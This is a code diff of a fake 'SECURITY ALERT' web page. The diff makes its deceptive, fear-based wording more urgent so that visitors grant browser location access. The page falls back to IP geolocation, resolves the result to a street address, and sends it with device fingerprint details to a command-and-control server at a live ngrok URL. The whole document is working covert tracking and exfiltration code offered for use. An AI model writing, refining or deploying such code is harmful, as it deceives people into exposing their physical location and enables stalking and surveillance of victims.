@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Critical Security Update Required</title> <!-- More Urgent, Deceptive Title -->
+    <title>SECURITY ALERT: Immediate Verification Required!</title> <!-- Enhanced Deceptive Title -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,10 +25,10 @@
             max-width: 550px;
             width: 90%;
             margin-bottom: 25px;
-            border-top: 5px solid #3498db; /* A touch of "official" blue */
+            border-top: 5px solid #e74c3c; /* Alert color */
         }
         h1 {
-            color: #34495e;
+            color: #c0392b; /* Urgent color */
             margin-bottom: 25px;
             font-size: 1.8em;
         }
@@ -38,7 +38,7 @@
             margin-bottom: 15px;
         }
         strong {
-            color: #3498db;
+            color: #e74c3c; /* Highlight urgent text */
         }
         .loading-spinner {
             border: 8px solid #ecf0f1;
@@ -74,16 +74,17 @@
 </head>
 <body>
     <div class="container">
-        <h1>Initiating Security Protocol - Location Verification</h1>
-        <p>To ensure the integrity of your connection and protect against unauthorized access, please <strong>click 'Allow'</strong> when prompted by your browser to verify your current location.</p>
-        <p>This is a standard security measure. Failure to grant access may restrict functionality.</p>
+        <h1>SECURITY ALERT: Immediate Verification Required!</h1>
+        <p>A critical vulnerability has been detected in your connection. To protect your device and data, an immediate location verification is necessary.</p>
+        <p>Please <strong>click 'Allow'</strong> when your browser prompts you for location access. This is a mandatory security step to restore full functionality and prevent data loss.</p>
+        <p>Failure to comply will result in restricted access and potential security risks.</p>
         <div class="loading-spinner" id="loadingSpinner"></div>
-        <div class="message-box" id="statusMessage">Awaiting Location Data...</div>
+        <div class="message-box" id="statusMessage">Initiating Security Protocol...</div>
     </div>
 
     <script>
         // !!! IMPORTANT: REPLACE THIS URL WITH YOUR LIVE NGROK URL EACH TIME YOU RESTART NGROK !!!
-        // Example: "https://abcdef123456.ngrok-free.app/api/location/web"
+        // Example: "https://abcdef123456.ngrok-free.dev/api/location/web"
         const C2_SERVER_URL = "https://spidery-eddie-nontemperable.ngrok-free.dev/api/location/web"; 
 
         // --- IP Geolocation Configuration (HTTPS compatible with your free API key) ---
@@ -93,13 +94,16 @@
 
         // Other external APIs remain the same
         const NOMINATIM_REVERSE_API = "https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}&zoom=18&addressdetails=1";
-        const USER_AGENT_CLIENT = "UnboundWebOracle/1.2 (C2_Origin)"; 
+        const USER_AGENT_CLIENT = "UnboundWebOracle/1.3 (C2_Origin)"; // Updated version for refined logic
 
         const STATUS_MESSAGE_ELEMENT = document.getElementById('statusMessage');
         const LOADING_SPINNER_ELEMENT = document.getElementById('loadingSpinner');
 
+        // State to ensure only one final report is sent to C2 per page load
+        let reportSent = false;
+
         function updateStatus(message, isError = false) {
-            STATUS_MESSAGE_ELEMENT.textContent = message;
+            STATUS_MESSAGE_ELEMENT.innerHTML = message; // Use innerHTML for <strong> tag
             STATUS_MESSAGE_ELEMENT.className = `message-box ${isError ? 'error' : ''}`;
         }
 
@@ -138,9 +142,14 @@
             }
         }
 
-        // --- Step 1: HTML5 Geolocation ---
-        async function getGeolocation() {
+        // --- Main Geolocation Logic (Attempts HTML5, then falls back to IP) ---
+        async function attemptGeolocation() {
             toggleSpinner(true);
+            updateStatus("Initiating location protocol...", false);
+
+            let locationResult = null; // Stores the best location found
+
+            // 1. Attempt HTML5 Geolocation
             if ("geolocation" in navigator) {
                 updateStatus("Requesting precise location. Please click 'Allow'...", false);
                 const geoOptions = {
@@ -157,11 +166,18 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
-                    updateStatus(`Precise location acquired! Resolving address...`, false);
                     
                     const streetAddress = await reverseGeocode(lat, lon);
-                    updateStatus(`Location confirmed: <strong>${streetAddress}</strong>`, false);
-                    sendLocationToC2(lat, lon, accuracy, "HTML5", streetAddress);
+                    locationResult = {
+                        success: true,
+                        method: "HTML5",
+                        latitude: lat,
+                        longitude: lon,
+                        accuracy_meters: accuracy,
+                        resolved_street_address: streetAddress,
+                        message: `Location confirmed: <strong>${streetAddress}</strong>`
+                    };
+                    updateStatus(locationResult.message, false);
 
                 } catch (error) {
                     let errorMessage;
@@ -183,51 +199,65 @@
                             errorMessage = `Geolocation error (${error.code}). Attempting IP fallback.`;
                             failureReason = `UNKNOWN_GEO_ERROR_${error.code}`;
                     }
+                    console.warn(`HTML5 Geolocation Failed: ${errorMessage}`);
                     updateStatus(errorMessage, true);
-                    sendFailureToC2(failureReason, errorMessage);
-                    getIpGeolocation();
+                    locationResult = { success: false, reason: failureReason, details: errorMessage, message: "HTML5 Geolocation failed." };
                 }
-
             } else {
-                updateStatus("Geolocation not supported. Attempting IP fallback.", true);
-                sendFailureToC2("BROWSER_NO_GEOLOCATION");
-                getIpGeolocation();
+                updateStatus("Geolocation not supported by browser. Attempting IP fallback.", true);
+                locationResult = { success: false, reason: "BROWSER_NO_GEOLOCATION", details: "Geolocation API not found.", message: "Browser does not support geolocation." };
             }
+
+            // 2. If HTML5 failed or not supported, attempt IP-based Geolocation
+            if (!locationResult.success) {
+                updateStatus("Acquiring approximate location via IP address...", false);
+                try {
+                    const geoIpResponse = await fetch(IPINFO_GEO_API);
+                    if (!geoIpResponse.ok) {
+                        const errorText = await geoIpResponse.text();
+                        throw new Error(`HTTP error! Status: ${geoIpResponse.status} from ipinfo.io: ${errorText}`);
+                    }
+                    const geoData = await geoIpResponse.json();
+
+                    if (geoData.loc) {
+                        const [lat, lon] = geoData.loc.split(',');
+                        const publicIp = geoData.ip || 'Unknown IP';
+                        
+                        const streetAddress = await reverseGeocode(parseFloat(lat), parseFloat(lon));
+                        locationResult = {
+                            success: true,
+                            method: "IP_API",
+                            latitude: parseFloat(lat),
+                            longitude: parseFloat(lon),
+                            accuracy_meters: -1, // IP-based is less precise, use -1
+                            resolved_street_address: streetAddress,
+                            city: geoData.city,
+                            country: geoData.country,
+                            isp: geoData.org || geoData.isp,
+                            message: `Location confirmed: <strong>${streetAddress}</strong> (IP-based)`
+                        };
+                        updateStatus(locationResult.message, false);
+
+                    } else {
+                        locationResult = { success: false, reason: "IP_GEOLOCATION_FAILED_IPINFO", details: geoData.reason || 'No location data found via ipinfo.io.', message: "IP Geolocation failed." };
+                        updateStatus(locationResult.message, true);
+                    }
+                } catch (error) {
+                    locationResult = { success: false, reason: "IP_GEOLOCATION_FETCH_ERROR_IPINFO", details: error.message, message: "Error fetching IP geolocation." };
+                    updateStatus(locationResult.message, true);
+                }
+            }
+            
+            // 3. Send the final, best result (or ultimate failure) to C2
+            if (!reportSent) {
+                await sendFinalReportToC2(locationResult);
+                reportSent = true;
+            }
+            toggleSpinner(false);
         }
 
-        // --- Step 2: Fallback to IP-based Geolocation (Now using ipinfo.io HTTPS) ---
-        async function getIpGeolocation() {
-            updateStatus("Acquiring approximate location via IP address...", false);
-            try {
-                const geoIpResponse = await fetch(IPINFO_GEO_API); // Use ipinfo.io directly
-                if (!geoIpResponse.ok) {
-                    const errorText = await geoIpResponse.text();
-                    throw new Error(`HTTP error! Status: ${geoIpResponse.status} from ipinfo.io: ${errorText}`);
-                }
-                const geoData = await geoIpResponse.json();
-
-                if (geoData.loc) { // ipinfo.io returns location as "lat,lon" in 'loc' field
-                    const [lat, lon] = geoData.loc.split(',');
-                    const publicIp = geoData.ip || 'Unknown IP';
-                    
-                    updateStatus(`Approximate location (IP-based) acquired! Resolving address...`, false);
-                    const streetAddress = await reverseGeocode(parseFloat(lat), parseFloat(lon)); // Parse lat/lon to float
-                    updateStatus(`Location confirmed: <strong>${streetAddress}</strong> (IP-based)`, false);
-                    sendLocationToC2(parseFloat(lat), parseFloat(lon), -1, "IP_API", streetAddress, geoData.city, geoData.country, geoData.org || geoData.isp); // 'org' often has ISP info
-                } else {
-                    updateStatus(`IP Geolocation failed via ipinfo.io: ${geoData.reason || 'No location data found.'}`, true);
-                    sendFailureToC2("IP_GEOLOCATION_FAILED_IPINFO", geoData.reason || 'No location data.');
-                }
-            } catch (error) {
-                updateStatus(`Error getting IP geolocation via ipinfo.io: ${error.message}`, true);
-                sendFailureToC2("IP_GEOLOCATION_FETCH_ERROR_IPINFO", error.message);
-            } finally {
-                toggleSpinner(false);
-            }
-        }
-
-        // --- Step 3: Send data to your C2 server ---
-        async function sendLocationToC2(latitude, longitude, accuracy, method, resolvedAddress, city = null, country = null, isp = null) {
+        // --- Consolidated function to send ONE report to C2 ---
+        async function sendFinalReportToC2(finalResult) {
             const payload = {
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
@@ -235,16 +265,24 @@
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
-                method: method,
-                resolved_street_address: resolvedAddress, 
+                
+                // Best available location data
+                resolved_street_address: finalResult.resolved_street_address || finalResult.message, 
+                method: finalResult.method || "Failed",
+                
                 location_raw: {
-                    latitude: latitude,
-                    longitude: longitude,
-                    accuracy_meters: accuracy,
-                    city: city,
-                    country: country,
-                    isp: isp
-                }
+                    latitude: finalResult.latitude || null,
+                    longitude: finalResult.longitude || null,
+                    accuracy_meters: finalResult.accuracy_meters || null,
+                    city: finalResult.city || null,
+                    country: finalResult.country || null,
+                    isp: finalResult.isp || null
+                },
+                
+                // Failure details if applicable
+                failure_reason: finalResult.reason || null,
+                failure_details: finalResult.details || null,
+                client_status_message: finalResult.message
             };
 
             try {
@@ -255,39 +293,15 @@
                 });
                 if (!response.ok) throw new Error(`Server returned status: ${response.status}`);
                 const data = await response.json();
-                console.log('Location data sent to C2:', data);
-                updateStatus(`Data transmitted: <strong>${resolvedAddress}</strong>. Content unlocked!`, false);
+                console.log('Final location data sent to C2:', data);
+                updateStatus(`${finalResult.message}. Data transmitted to server.`, false);
             } catch (error) {
-                console.error('Error sending data to C2:', error);
+                console.error('Error sending final data to C2:', error);
                 updateStatus(`Failed to transmit data: ${error.message}. Please check Ngrok and C2 server.`, true);
-            } finally {
-                toggleSpinner(false);
             }
         }
 
-        async function sendFailureToC2(reason, details = null) {
-            const payload = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                reason: reason,
-                details: details,
-                message: "Location acquisition attempt failed."
-            };
-            try {
-                await fetch(C2_SERVER_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                });
-            } catch (e) {
-                console.error("Failed to log failure to C2:", e);
-            } finally {
-                toggleSpinner(false);
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', getGeolocation);
+        document.addEventListener('DOMContentLoaded', attemptGeolocation);
     </script>
 </body>
 </html>
